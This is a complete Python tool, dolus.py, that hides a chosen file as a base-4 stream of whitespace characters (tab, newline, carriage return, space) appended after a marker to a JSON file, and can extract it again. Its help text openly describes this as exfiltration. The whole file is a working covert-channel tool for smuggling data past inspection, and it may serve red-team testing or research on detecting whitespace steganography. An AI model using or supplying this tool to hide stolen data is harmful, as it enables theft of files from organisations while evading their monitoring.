#!/usr/bin/env python3
"""
dolus.py

A script for encoding and decoding exfil files within JSON.

Author: Dana Epp
Email: dana@vulscan.com

Licensed under the MIT License. See LICENSE file in the project root for full license information.
"""

import argparse
import sys

# Symbols to use for BASE4
SYMBOLS = [0x09, 0x0a, 0x0d, 0x20]

# DEMARK Sequence
DEMARK = b'\x0d\x0a\x09\x20'

def get_bytes_after_marker(data: bytes, marker: bytes) -> bytes:
    index = data.find(marker)
    if index != -1:
        return data[index + len(marker):]
    return bytes()

def get_index(symbol):
    try:
        return SYMBOLS.index(symbol)
    except ValueError:
        raise ValueError(f"Symbol {symbol} not found in SYMBOLS")

def bytes_to_base4(input_bytes) -> bytes:
    base4_string_buffer = []
    for byte in input_bytes:
        quotient = byte
        base4_digits = [0] * 8
        for j in range(7, -1, -1):
            base4_digits[j] = SYMBOLS[quotient % 4]
            quotient //= 4
        base4_string_buffer.extend(base4_digits)
    return bytes(base4_string_buffer)

def base4_to_bytes(base4_string_buffer):
    size_base4_string_buffer = len(base4_string_buffer)
    n = size_base4_string_buffer // 8
    byte_string_buffer = bytearray(n)

    for i in range(n):
        byte = 0
        for j in range(8):
            byte = (byte << 2) | get_index(base4_string_buffer[i * 8 + j])
        byte_string_buffer[i] = byte

    return bytes(byte_string_buffer)

def read_file_to_bytes(file_path: str, mode: str = 'rb') -> bytes:
    with open(file_path, mode) as file:
        return file.read()

def encode(input_file, output_file, exfil_file):
    exfil_data = read_file_to_bytes(exfil_file)
    encoded_bytes = bytes_to_base4(exfil_data)

    with open(input_file, 'rb') as file:
        file_content = file.read()
        encoded_content = file_content + DEMARK + encoded_bytes

    with open(output_file, 'wb') as file:
        file.write(encoded_content)

def decode(input_file, output_file):
    encoded_data = read_file_to_bytes(input_file)
    b4_exfil_data = get_bytes_after_marker(encoded_data, DEMARK)
    if b4_exfil_data:
        exfil_data = base4_to_bytes(b4_exfil_data)
    else:
        print("Hidden data marker not found. Aborting")
        sys.exit(-1)

    with open(output_file, 'wb') as file:
        file.write(exfil_data)

def main():
    parser = argparse.ArgumentParser(description="Encode or decode JSON files with exfil data")
    parser.add_argument('-i', '--input', required=True, help="Input JSON file")
    parser.add_argument('-o', '--output', required=True, help="Output JSON file")
    parser.add_argument('-x', '--exfil', required=False, help="File to exfiltrate (used when encoding)")
    group = parser.add_mutually_exclusive_group(required=True)
    group.add_argument('-e', '--encode', action='store_true', help="Encode the input file")
    group.add_argument('-d', '--decode', action='store_true', help="Decode the input file")

    args = parser.parse_args()

    if args.encode:
        if args.exfil is None:
            print("Exfil file must be provided when encoding.")
            sys.exit(-1)
        encode(args.input, args.output, args.exfil)
    elif args.decode:
        decode(args.input, args.output)

if __name__ == "__main__":
    main()